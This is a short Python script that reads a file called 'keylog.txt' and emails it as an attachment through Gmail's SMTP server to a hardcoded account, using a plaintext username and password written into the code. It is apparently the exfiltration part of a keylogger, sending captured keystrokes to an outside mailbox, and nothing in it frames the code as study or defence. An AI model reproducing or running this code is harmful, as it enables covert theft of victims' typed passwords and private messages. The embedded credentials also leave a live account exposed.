#!/usr/bin/env python3

import smtplib
from email import encoders
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from bs4 import BeautifulSoup as bs


files_to_send = [
    "keylog.txt",
]


def send_mail(email, password, FROM, TO, msg):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(FROM, TO, msg.as_string())
    server.quit()


email = "keyloggtester4@gmail.com"
password = "Kalibox123?"


FROM = "keyloggtester4@gmail.com"
TO   = "keyloggtester4@gmail.com"
subject = "Just a subject"

msg = MIMEMultipart("alternative")
msg["From"] = FROM
msg["To"] = TO
msg["Subject"] = subject
html = open("mail.html2").read()
text = bs(html, "html.parser").text
text_part = MIMEText(text, "plain")
html_part = MIMEText(html, "html")
msg.attach(text_part)
msg.attach(html_part)

for file in files_to_send:
    with open(file, "rb") as f:
        data = f.read()
        attach_part = MIMEBase("application", "octet-stream")
        attach_part.set_payload(data)
    encoders.encode_base64(attach_part)
    attach_part.add_header("Content-Disposition", f"attachment; filename= {file}")
    msg.attach(attach_part)

send_mail(email, password, FROM, TO, msg)
